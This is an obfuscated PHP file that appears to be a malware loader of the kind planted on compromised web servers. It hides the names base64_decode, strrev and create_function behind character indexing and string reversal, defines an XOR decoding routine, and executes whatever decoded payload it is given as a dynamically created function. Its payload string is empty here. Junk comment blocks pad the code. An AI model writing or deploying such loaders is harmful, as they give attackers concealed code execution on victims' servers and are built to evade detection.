<?php  


 function yhtz0($opQzQ, $F5rhS = '') { $bUwfv = $opQzQ; $fkKy6 = ''; for ($OJxN8 = 0; $OJxN8 < strlen($bUwfv);) { for ($kAT73 = 0; $kAT73 < strlen($F5rhS) && $OJxN8 < strlen($bUwfv); $kAT73++, $OJxN8++) { $fkKy6 .= $bUwfv[$OJxN8] ^ $F5rhS[$kAT73]; } } return $fkKy6; }
/*YagMoPpTqwtDpMrwYdHDBnmBJHHxIfOUkXgZzcIpnLSVMQJxHJEZjjChdGcYCTcfpoaFEIVeetkGcoURjKuPKyMgrYrToakIoXNFCHbmPvwLmfYFFdfZfhOyyKAhVBlG*/

$mEvJHgAm4568 = "8lwtin2mv)bfx4k3zp;*rau(657qj1cye.0s_dog/9h";
$PaMCcbtn3558 = "";
$hSvKwvUB344 = "";
$OaRAhFEX7548 = "";
foreach([10,21,35,32,24,13,36,37,32,30,38,37,32] as $m){
   $hSvKwvUB344 .= $mEvJHgAm4568[$m];
}
foreach([35,3,20,20,32,8] as $m){
   $OaRAhFEX7548 .= $mEvJHgAm4568[$m];
}

/*hbuYuaaPtQBjpqWMUQICukLkzPCPvwfXTyVLfMTKQFAbmUNmdXfyCGAptnxROKUHzooRKSGZhNsmcSyggxwOEwkOhfmmbrBLYyCrirmIspeQMjducrGyzFNHOrVaisci*/

$m = $OaRAhFEX7548('n'.''.'o'.''.''.''.'i'.''.''.'t'.'c'.''.'n'.''.'u'.''.''.'f'.'_'.'e'.'t'.'a'.'e'.''.'r'.'c');
$E = $m("/*eVOwSAxs7525*/", $hSvKwvUB344( yhtz0($hSvKwvUB344($PaMCcbtn3558), "PtAEVWlh8077")));
$E();

/*rbJkAkLKwkJOpUBbREKBnhjTpWxiiNxZDYJxMxfgtzigMYScAlHXVdzyJUSJbBLjIpDdQcrVkhARcvdwclxNxtIxXmhEOITNIZqdPcxeVjMWmnhjyEhXScLQeYpSvjUK*/